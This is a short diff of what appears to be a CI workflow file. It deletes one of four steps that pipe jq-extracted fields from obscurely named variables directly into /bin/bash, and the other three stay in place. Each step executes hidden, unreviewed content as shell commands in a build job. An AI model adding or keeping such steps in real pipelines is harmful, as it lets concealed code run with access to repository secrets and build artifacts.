@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$vfx4" | jq -r .lh5409 | /bin/bash
           printf '%s' "$teim72" | jq -r .ijro223 | /bin/bash
           echo $jf7 | jq -r .qvje1 | /bin/bash
-          printf '%s' "$uwosb13583" | jq -r .idqf321 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
